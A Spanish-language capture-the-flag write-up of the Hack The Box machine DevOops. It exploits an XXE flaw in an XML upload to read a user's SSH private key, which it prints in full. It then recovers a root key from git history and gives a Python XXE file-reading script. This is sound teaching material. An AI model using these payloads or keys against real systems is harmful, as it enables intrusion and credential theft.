---
layout: single
title: DevOops HTB - WriteUp
excerpt: WriteUp de la máquina DevOops de HTB.
date: 2023-02-19
classes: wide
header:
  teaser: /assets/images/DevOops/DevOops.png
  teaser_home_page: true
  icon: /assets/images/DevOops/DevOops.png
categories:
  - infosec
tags:
  - ctf
  - Linux                                                                                                                                                                                 
  - Writeup
  - Web-Fuzzing                                                                                                                                                                                  
  - XXE                                                                                                                                                                                     
  - Git
---

En el dia de hoy estaremos resolviendo la Máquina Dev0ops de HTB. Espero que te sirva este WriteUp.

### Enumeración

Lo primero que haré será un escaneo de puertos con nmap.

```bash
❯ nmap -sC -sV -Pn -n -oN Extraction -p22,5000 10.10.10.91
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2023-02-19 18:24 CET
Nmap scan report for 10.10.10.91
Host is up (0.054s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 42:90:e3:35:31:8d:8b:86:17:2a:fb:38:90:da:c4:95 (RSA)
|   256 b7:b6:dc:c4:4c:87:9b:75:2a:00:89:83:ed:b2:80:31 (ECDSA)
|_  256 d5:2f:19:53:b2:8e:3a:4b:b3:dd:3c:1f:c0:37:0d:00 (ED25519)
5000/tcp open  http    Gunicorn 19.7.1
|_http-server-header: gunicorn/19.7.1
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Podemos ver que unicamente estan abiertos 22 (ssh) y 5000 (http) podemos ver que el puerto http esta montado sobre Gunicorn y se esta exponiendo la versión 19. 7. 1
Gunicorn es un servidor web hecho en Python.

Si entramos al servidor web no veremos nada interesante a simple vista. Vamos a hacer Fuzzing de directorios para ver si encontramos algo mas de contenido.

```bash
 gobuster dir -t 30 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://10.10.10.91:5000
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.91:5000
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/02/19 18:33:38 Starting gobuster in directory enumeration mode
===============================================================
/feed                 (Status: 200) [Size: 546263]
/upload               (Status: 200) [Size: 347]
```

Podemos ver dos directorios que responden con codigo de estado 200:

- /feed -> No tiene nada interesante, tan solo una imagen.
- /upload -> Permite subir archivos con una estructura XML, admeas si miramos el código fuente de la página podemos ver el siguiente comentario.

```html
<!-- TODO: make XML schema for this -->
```

Upload admite archivos XML y estos deben seguir la siguiente estructura:

```xml
<Block>
	<Author>test</Author> 
	<Subject>test</Subject>
	<Content>test</Content>
</Block>
```

Si probamos subir el archivo recibimos el siguiente mensaje:

```r
PROCESSED BLOGPOST: Author: test Subject: test Content: test URL for later reference: /uploads/test.xml File path: /home/roosa/deploy/src
```

### Explotación WEB

Este mensaje de error nos ha revelado una ruta del sistema y con ella un usuario. Ahora voy a probar hacer un ataque XXE para leer archivos del sistema. Lo primero que intentare leer será la clave id_rsa del usuario.

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM  "file:///home/roosa/.ssh/id_rsa" >]>
<Block>
        <Author>&xxe;</Author>
        <Subject>test</Subject>
        <Content>test</Content>
</Block>
```

Así quedaría el payload usado para intentar leer ficheros del sistema. Si subimos ese fichero podemos leer la clave privada del usuario roosa.

```bash
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAuMMt4qh/ib86xJBLmzePl6/5ZRNJkUj/Xuv1+d6nccTffb/7
9sIXha2h4a4fp18F53jdx3PqEO7HAXlszAlBvGdg63i+LxWmu8p5BrTmEPl+cQ4J
R/R+exNggHuqsp8rrcHq96lbXtORy8SOliUjfspPsWfY7JbktKyaQK0JunR25jVk
v5YhGVeyaTNmSNPTlpZCVGVAp1RotWdc/0ex7qznq45wLb2tZFGE0xmYTeXgoaX4
9QIQQnoi6DP3+7ErQSd6QGTq5mCvszpnTUsmwFj5JRdhjGszt0zBGllsVn99O90K
m3pN8SN1yWCTal6FLUiuxXg99YSV0tEl0rfSUwIDAQABAoIBAB6rj69jZyB3lQrS
JSrT80sr1At6QykR5ApewwtCcatKEgtu1iWlHIB9TTUIUYrYFEPTZYVZcY50BKbz
ACNyme3rf0Q3W+K3BmF//80kNFi3Ac1EljfSlzhZBBjv7msOTxLd8OJBw8AfAMHB
lCXKbnT6onYBlhnYBokTadu4nbfMm0ddJo5y32NaskFTAdAG882WkK5V5iszsE/3
koarlmzP1M0KPyaVrID3vgAvuJo3P6ynOoXlmn/oncZZdtwmhEjC23XALItW+lh7
e7ZKcMoH4J2W8OsbRXVF9YLSZz/AgHFI5XWp7V0Fyh2hp7UMe4dY0e1WKQn0wRKe
8oa9wQkCgYEA2tpna+vm3yIwu4ee12x2GhU7lsw58dcXXfn3pGLW7vQr5XcSVoqJ
Lk6u5T6VpcQTBCuM9+voiWDX0FUWE97obj8TYwL2vu2wk3ZJn00U83YQ4p9+tno6
NipeFs5ggIBQDU1k1nrBY10TpuyDgZL+2vxpfz1SdaHgHFgZDWjaEtUCgYEA2B93
hNNeXCaXAeS6NJHAxeTKOhapqRoJbNHjZAhsmCRENk6UhXyYCGxX40g7i7T15vt0
ESzdXu+uAG0/s3VNEdU5VggLu3RzpD1ePt03eBvimsgnciWlw6xuZlG3UEQJW8sk
A3+XsGjUpXv9TMt8XBf3muESRBmeVQUnp7RiVIcCgYBo9BZm7hGg7l+af1aQjuYw
agBSuAwNy43cNpUpU3Ep1RT8DVdRA0z4VSmQrKvNfDN2a4BGIO86eqPkt/lHfD3R
KRSeBfzY4VotzatO5wNmIjfExqJY1lL2SOkoXL5wwZgiWPxD00jM4wUapxAF4r2v
vR7Gs1zJJuE4FpOlF6SFJQKBgHbHBHa5e9iFVOSzgiq2GA4qqYG3RtMq/hcSWzh0
8MnE1MBL+5BJY3ztnnfJEQC9GZAyjh2KXLd6XlTZtfK4+vxcBUDk9x206IFRQOSn
y351RNrwOc2gJzQdJieRrX+thL8wK8DIdON9GbFBLXrxMo2ilnBGVjWbJstvI9Yl
aw0tAoGAGkndihmC5PayKdR1PYhdlVIsfEaDIgemK3/XxvnaUUcuWi2RhX3AlowG
xgQt1LOdApYoosALYta1JPen+65V02Fy5NgtoijLzvmNSz+rpRHGK6E8u3ihmmaq
82W3d4vCUPkKnrgG8F7s3GL6cqWcbZBd0j9u88fUWfPxfRaQU3s=
-----END RSA PRIVATE KEY-----
```

Ahora vamos a intentar conectarnos por ssh usando esa clave id_rsa.

```bash
❯ ssh -i id_rsa roosa@10.10.10.91
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-37-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

135 packages can be updated.
60 updates are security updates.

Last login: Sun Feb 19 12:47:05 2023 from 10.10.16.4
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

roosa@devoops:~$
```

Hemos ganado acceso al sistema ahora toca enumerarlo.

### Enumeración del sistema

Despues de enumerar permisos especiales, tareas y capabilities y no encontrar nada me percaté de que en el directorio personal de roosa hay dos carpetas que tienen el contenido de la web.

- deploy
	- Contiene otra carpeta llamada blogfeed
- work

Aparentemente tienen el mismo contenido bloogfeed y work, pero blogfeed contiene un directorio .git voy a enumerar los commits que se han estado haciendo para ver si puedo extraer algo de información.

Podemos ver los siguientes commits:

```bash
roosa@devoops:~/work/blogfeed$ git log --oneline
7ff507d Use Base64 for pickle feed loading
26ae6c8 Set PIN to make debugging faster as it will no longer change every time the application code is changed. Remember to remove before production use.
cec54d8 Debug support added to make development more agile.
ca3e768 Blogfeed app, initial version.
dfebfdf Gunicorn startup script
33e87c3 reverted accidental commit with proper key
d387abf add key for feed integration from tnerprise backend
1422e5a Initial commit
```

### Explotación Sistema

Hay uno que me llama la atención -> "33e87c3 reverted accidental commit with proper key"
Voy a ver los cambios que se hicieron en ese commit.

```bash
roosa@devoops:~/work/blogfeed$ git show 33e87c3                                                                                                                                         [2/2]
commit 33e87c312c08735a02fa9c796021a4a3023129ad                                                                                                                                              
commit 33e87c312c08735a02fa9c796021a4a3023129ad                                                                                                                                              
Author: Roosa Hakkerson <roosa@solita.fi>
Date:   Mon Mar 19 09:33:06 2018 -0400

    reverted accidental commit with proper key

diff --git a/resources/integration/authcredentials.key b/resources/integration/authcredentials.key
index 44c981f..f4bde49 100644
--- a/resources/integration/authcredentials.key 
+++ b/resources/integration/authcredentials.key 
@@ -1,28 +1,27 @@
 -----BEGIN RSA PRIVATE KEY-----
-MIIEogIBAAKCAQEArDvzJ0k7T856dw2pnIrStl0GwoU/WFI+OPQcpOVj9DdSIEde
-8PDgpt/tBpY7a/xt3sP5rD7JEuvnpWRLteqKZ8hlCvt+4oP7DqWXoo/hfaUUyU5i
-vr+5Ui0nD+YBKyYuiN+4CB8jSQvwOG+LlA3IGAzVf56J0WP9FILH/NwYW2iovTRK
-nz1y2vdO3ug94XX8y0bbMR9Mtpj292wNrxmUSQ5glioqrSrwFfevWt/rEgIVmrb+
-CCjeERnxMwaZNFP0SYoiC5HweyXD6ZLgFO4uOVuImILGJyyQJ8u5BI2mc/SHSE0c
-F9DmYwbVqRcurk3yAS+jEbXgObupXkDHgIoMCwIDAQABAoIBAFaUuHIKVT+UK2oH
-uzjPbIdyEkDc3PAYP+E/jdqy2eFdofJKDocOf9BDhxKlmO968PxoBe25jjjt0AAL
-gCfN5I+xZGH19V4HPMCrK6PzskYII3/i4K7FEHMn8ZgDZpj7U69Iz2l9xa4lyzeD
-k2X0256DbRv/ZYaWPhX+fGw3dCMWkRs6MoBNVS4wAMmOCiFl3hzHlgIemLMm6QSy
-NnTtLPXwkS84KMfZGbnolAiZbHAqhe5cRfV2CVw2U8GaIS3fqV3ioD0qqQjIIPNM
-HSRik2J/7Y7OuBRQN+auzFKV7QeLFeROJsLhLaPhstY5QQReQr9oIuTAs9c+oCLa
-2fXe3kkCgYEA367aoOTisun9UJ7ObgNZTDPeaXajhWrZbxlSsOeOBp5CK/oLc0RB
-GLEKU6HtUuKFvlXdJ22S4/rQb0RiDcU/wOiDzmlCTQJrnLgqzBwNXp+MH6Av9WHG
-jwrjv/loHYF0vXUHHRVJmcXzsftZk2aJ29TXud5UMqHovyieb3mZ0pcCgYEAxR41
-IMq2dif3laGnQuYrjQVNFfvwDt1JD1mKNG8OppwTgcPbFO+R3+MqL7lvAhHjWKMw
-+XjmkQEZbnmwf1fKuIHW9uD9KxxHqgucNv9ySuMtVPp/QYtjn/ltojR16JNTKqiW
-7vSqlsZnT9jR2syvuhhVz4Ei9yA/VYZG2uiCpK0CgYA/UOhz+LYu/MsGoh0+yNXj
-Gx+O7NU2s9sedqWQi8sJFo0Wk63gD+b5TUvmBoT+HD7NdNKoEX0t6VZM2KeEzFvS
-iD6fE+5/i/rYHs2Gfz5NlY39ecN5ixbAcM2tDrUo/PcFlfXQhrERxRXJQKPHdJP7
-VRFHfKaKuof+bEoEtgATuwKBgC3Ce3bnWEBJuvIjmt6u7EFKj8CgwfPRbxp/INRX
-S8Flzil7vCo6C1U8ORjnJVwHpw12pPHlHTFgXfUFjvGhAdCfY7XgOSV+5SwWkec6
-md/EqUtm84/VugTzNH5JS234dYAbrx498jQaTvV8UgtHJSxAZftL8UAJXmqOR3ie
-LWXpAoGADMbq4aFzQuUPldxr3thx0KRz9LJUJfrpADAUbxo8zVvbwt4gM2vsXwcz
-oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
-LS4O7JPRqVmgZzUUnDiAVuUHWuHGGXpWpz9EGau6dIbQaUUSOEE=
...SNIP...
```

Se ha eliminado una clave privada RSA puede que sea de algún usuario del sistema. Si la guardamos en un archivo y probamos usarla con los usuarios que tienen una bash asignada, que son los suguientes:

```bash
roosa@devoops:~/work/blogfeed$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
git:x:1001:1001:git,,,:/home/git:/bin/bash
roosa:x:1002:1002:,,,:/home/roosa:/bin/bash
```

Si probamos iniciar como el usuario git no funcionará pero si lo hacemos como root podremos conectarnos exitosamente.

```bash
❯ ssh -i id_rsa2 root@10.10.10.91
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-37-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

135 packages can be updated.
60 updates are security updates.

Last login: Fri Sep 23 09:46:30 2022
root@devoops:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### Bonus

He hecho un script en python para explotar el XXE y le puedas pasar como argumento el archivo del sistema que quieras leer.

```python
import requests,sys

proxies={"http":"http://127.0.0.1:8080"}
url = "http://10.10.10.91:5000/upload"

def help():

	print ("[!] Ejemplo: ",sys.argv[0], "/etc/passwd")


def xxe(file):

	headers = {"Content-Type":"multipart/form-data; boundary=----WebKitFormBoundarye9DdoqEyGv2lrcPH"}

	data = """
------WebKitFormBoundarye9DdoqEyGv2lrcPH
Content-Disposition: form-data; name="file"; filename="test.xml"
Content-Type: text/xml

<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM  "file:///{file}" >]>
<Block>
	<Author>&xxe;</Author> 
	<Subject>test</Subject>
	<Content>test</Content>
</Block>

------WebKitFormBoundarye9DdoqEyGv2lrcPH--


""".format(file=file)

	r= requests.post(url,data=data,headers=headers,proxies=proxies)
	print (r.text)

if __name__ == '__main__':

	if len(sys.argv) != 2:
		help()
	else:
		xxe(sys.argv[1])
```

Ejecución:

```bash
❯ python3 xxe.py /etc/hosts
 PROCESSED BLOGPOST: 
  Author: 127.0.0.1     localhost
127.0.1.1       devoops

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

 Subject: test
 Content: test
 URL for later reference: /uploads/test.xml
 File path: /home/roosa/deploy/src
```

